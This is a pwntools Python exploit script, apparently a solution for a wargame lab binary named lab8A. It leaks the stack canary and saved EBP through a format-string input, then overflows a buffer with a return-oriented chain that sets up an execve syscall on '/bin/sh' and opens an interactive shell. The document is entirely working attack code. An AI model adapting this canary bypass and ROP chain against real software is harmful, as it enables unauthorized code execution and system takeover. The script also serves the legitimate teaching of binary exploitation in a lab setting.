from pwn import *
settings = {
    "binary"        : "/levels/lab08/lab8A",
}
def exploit():
    #print("PID: "+str(pidof(p)))
    pause()
    p.sendlineafter("Enter Your Favorite Author's Last Name: ","%130$p-%131$p-/bin/sh")
    leak=str(p.recvline()).split("-")
    canary=leak[0]
    EBP=leak[1]
    print("Canary: "+canary)
    print("EBP: "+EBP)
	
    canary_value = int(canary,16)

    EBP_value = int(EBP,16)
    
    binsh_addr = EBP_value - 0x21a 	# based on leaked EBP, calculate the address of the "/bin/sh" string we deliver on the stack with the format string
    

	# Now we call readA() just to have selecAABook() return. We won't exploit it due to scanf("%s") and the 
    # nullbyte-armoured canary. We proceed to findSomeWords().
    p.sendline("A")

    # Binary is statically compiled, we don't need to leak the code segment.
    ROP = ""

	# EDX = 0
    ROP = ROP + p32(0x80554f0)	# xor eax eax ;;
    ROP = ROP + p32(0x80aa955) # xchg edx eax ;;	 

    # EAX = 0xb without using a nullbyte in the string
    ROP = ROP + p32(0x80554f0) # xor eax eax ;; -> EAX = 0
    # followed by 11 "inc eax" instructions
    ROP = ROP + p32(0x80ea08b) # inc eax ;; 
    ROP = ROP + p32(0x80ea08b) # inc eax ;;
    ROP = ROP + p32(0x80ea08b) # inc eax ;;
    ROP = ROP + p32(0x80ea08b) # inc eax ;;
    ROP = ROP + p32(0x80ea08b) # inc eax ;;
    ROP = ROP + p32(0x80ea08b) # inc eax ;;
    ROP = ROP + p32(0x80ea08b) # inc eax ;;
    ROP = ROP + p32(0x80ea08b) # inc eax ;;
    ROP = ROP + p32(0x80ea08b) # inc eax ;;
    ROP = ROP + p32(0x80ea08b) # inc eax ;;
    ROP = ROP + p32(0x80ea08b) # inc eax ;;

    # ECX = 0
    ROP = ROP + p32(0x80e71c5) # pop ecx ;;
    ROP = ROP + p32(0xffffffff)# ECX = 0xffffffff
    ROP = ROP + p32(0x80dcbf4) # inc ecx ;; // overflow ECX to 0

    # EBX = "/bin/sh"
    ROP = ROP + p32(0x804fb14) # pop ebx ;;
    ROP = ROP + p32(binsh_addr) #	// the address of "sh" string

	# INT 0x80
    ROP = ROP + p32(0x806f8ff) # int 0x80
	
	
    # OK, shelltime
    payload = "B"*16	# fill the buf[24] in findSomeWords()
    ## BBBB to pad the last four bytes of buff[24]
    payload = payload + p32(0xdeadbeef) + "BBBB" + p32(canary_value) + p32(EBP_value) + ROP
	
    p.sendlineafter("..I like to read ^_^ <==  ",payload)
    p.recv()
    p.interactive()
	
    return 0

# Initial setup
if __name__  == "__main__":
    binary = ELF(settings['binary'])
    context.log_level = 'debug'
    p = process(binary.path,stdin=PTY)
    #p=remote("127.0.0.1", 8841)
    exploit()